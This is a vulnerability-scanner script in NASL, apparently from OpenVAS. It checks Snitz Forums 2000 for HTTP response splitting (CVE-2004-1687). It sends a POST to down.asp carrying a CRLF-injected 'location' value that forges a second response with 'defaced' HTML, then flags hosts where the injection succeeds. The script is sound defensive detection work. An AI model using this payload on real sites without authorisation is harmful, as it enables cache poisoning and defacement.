# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14783");
  script_version("2024-06-13T05:05:46+0000");
  script_tag(name:"last_modification", value:"2024-06-13 05:05:46 +0000 (Thu, 13 Jun 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2004-1687");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11201");
  script_name("Snitz Forums 2000 HTTP Response Splitting");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "cross_site_scripting.nasl",
                      "global_settings.nasl", "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to the latest version of this software.");

  script_tag(name:"summary", value:"The remote host is using Snitz Forums 2000 - an ASP based forum/bbs.

  There is a bug in this software which makes it vulnerable to HTTP response
  splitting vulnerability.");

  script_tag(name:"impact", value:"An attacker may use this bug to perform web cache poisoning, xss attack, etc.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_asp(port:port))exit(0);

host = http_host_name( dont_add_port:TRUE );
if( http_get_has_generic_xss( port:port, host:host ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/forum", "/forums", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  req = string("POST ", dir, "/down.asp HTTP/1.1\r\n",
  "Content-Type: application/x-www-form-urlencoded\r\n",
  "Host: ", host, "\r\n",
  "Content-length: 134\r\n",
  "\r\n",
  "location=/foo?%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:%2014%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}defaced{/html}");
  r = http_keepalive_send_recv(port:port, data:req);
  if( ! r ) continue;

  if(r =~ "^HTTP/1\.[01] 200" && string("Content-Length: 14\r\nContent-Type: text/html\r\n\r\n{html}defaced{/html}\r\nContent-Length: ") >< r) {
    security_message( port:port );
    exit( 0 );
  }
}

exit(99);
